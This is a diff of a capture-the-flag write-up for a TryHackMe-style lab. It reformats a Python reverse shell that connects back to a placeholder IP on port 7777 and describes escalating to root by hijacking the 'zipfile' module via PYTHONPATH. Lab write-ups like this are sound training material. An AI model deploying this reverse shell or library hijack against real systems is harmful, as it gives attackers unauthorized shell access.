@@ -106,14 +106,17 @@ there is a library imported `zipfile`, lets overwrite that!
 lets make a file privesc.py on our machine, we can download that by running a small server on our machine and using wget. 
 
 This code will open a socket connection to our machine on port 7777.
-```python
-import socket,subprocess,os
+<pre data-src="privsec.py" 
+  data-download-link 
+  data-download-link-label="get_app" 
+><code class="language-py">import socket,subprocess,os
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 s.connect(("$YOUR_IP",7777));os.dup2(s.fileno(),0)
 os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
-p=subprocess.call(["/bin/bash","-i"])
-```
+p=subprocess.call(["/bin/bash","-i"])</code>
+</pre>
+
 
 Because `import zipfile` is run, it will execute the code inside of `zipfile.py` so we are going to rename the file on the remote and then add it to the **$PYTHONPATH** environment variable.
 
@@ -131,3 +134,5 @@ lets cat the root flag!
 <pre class="command-line" data-prompt="root@vulnnet-dotpy $" data-output="2">
 <code class="language-bash">cat ~/root.txt
 THM{********************************}</code></pre>
+
+<script data-name="BMC-Widget" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="daanbreur" data-description="Support me on Buy me a coffee!" data-message="Thank you for visiting. You can now buy me a coffee!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>
